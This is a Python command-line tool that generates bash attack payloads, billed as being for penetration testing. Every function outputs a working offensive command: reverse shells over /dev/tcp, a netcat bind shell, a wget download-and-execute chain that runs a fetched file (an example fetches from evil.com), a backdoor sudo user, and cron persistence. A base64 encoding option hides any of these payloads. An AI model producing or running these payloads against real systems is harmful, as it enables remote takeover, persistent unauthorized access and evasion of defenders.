#!/usr/bin/env python3
"""
Bash Payload Generator
Generate various bash payloads for penetration testing
"""

import argparse
import base64

class BashPayloadGenerator:
    def __init__(self):
        self.payloads = {}

    def reverse_shell(self, lhost, lport):
        """Generate bash reverse shell"""
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        return payload

    def reverse_shell_alt(self, lhost, lport):
        """Alternative bash reverse shell"""
        payload = f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196"
        return payload

    def bind_shell(self, lport):
        """Generate bash bind shell"""
        payload = f"nc -lvp {lport} -e /bin/bash"
        return payload

    def download_execute(self, url):
        """Generate download and execute payload"""
        payload = f"wget {url} -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"
        return payload

    def user_add(self, username, password):
        """Generate user addition payload"""
        payload = f"useradd -m {username} && echo '{username}:{password}' | chpasswd && usermod -aG sudo {username}"
        return payload

    def persistence_cron(self, command):
        """Generate cron persistence payload"""
        payload = f"(crontab -l 2>/dev/null; echo '*/5 * * * * {command}') | crontab -"
        return payload

    def encode_base64(self, payload):
        """Encode payload in base64"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"

    def obfuscate_simple(self, payload):
        """Simple obfuscation"""
        return f"$(echo '{payload}' | base64 -d)"

def main():
    parser = argparse.ArgumentParser(
        description='Bash Payload Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Reverse shell:
    %(prog)s -t reverse_shell -H 10.10.10.1 -p 4444

  Bind shell:
    %(prog)s -t bind_shell -p 4444

  Download and execute:
    %(prog)s -t download_exec -u http://evil.com/payload.sh

  Add user:
    %(prog)s -t user_add -U hacker -P password123

  Encode payload:
    %(prog)s -t reverse_shell -H 10.10.10.1 -p 4444 -e
        '''
    )

    parser.add_argument('-t', '--type', required=True,
                        choices=['reverse_shell', 'reverse_shell_alt', 'bind_shell',
                                 'download_exec', 'user_add', 'persistence'],
                        help='Payload type')
    parser.add_argument('-H', '--host', help='LHOST for reverse shell')
    parser.add_argument('-p', '--port', help='Port number')
    parser.add_argument('-u', '--url', help='URL for download')
    parser.add_argument('-U', '--username', help='Username')
    parser.add_argument('-P', '--password', help='Password')
    parser.add_argument('-c', '--command', help='Command for persistence')
    parser.add_argument('-e', '--encode', action='store_true', help='Base64 encode payload')

    args = parser.parse_args()

    generator = BashPayloadGenerator()
    payload = None

    if args.type == 'reverse_shell':
        if not args.host or not args.port:
            parser.error("reverse_shell requires -H and -p")
        payload = generator.reverse_shell(args.host, args.port)

    elif args.type == 'reverse_shell_alt':
        if not args.host or not args.port:
            parser.error("reverse_shell_alt requires -H and -p")
        payload = generator.reverse_shell_alt(args.host, args.port)

    elif args.type == 'bind_shell':
        if not args.port:
            parser.error("bind_shell requires -p")
        payload = generator.bind_shell(args.port)

    elif args.type == 'download_exec':
        if not args.url:
            parser.error("download_exec requires -u")
        payload = generator.download_execute(args.url)

    elif args.type == 'user_add':
        if not args.username or not args.password:
            parser.error("user_add requires -U and -P")
        payload = generator.user_add(args.username, args.password)

    elif args.type == 'persistence':
        if not args.command:
            parser.error("persistence requires -c")
        payload = generator.persistence_cron(args.command)

    if payload:
        if args.encode:
            payload = generator.encode_base64(payload)

        print("[+] Generated Bash Payload:")
        print("-" * 60)
        print(payload)
        print("-" * 60)

if __name__ == "__main__":
    main()
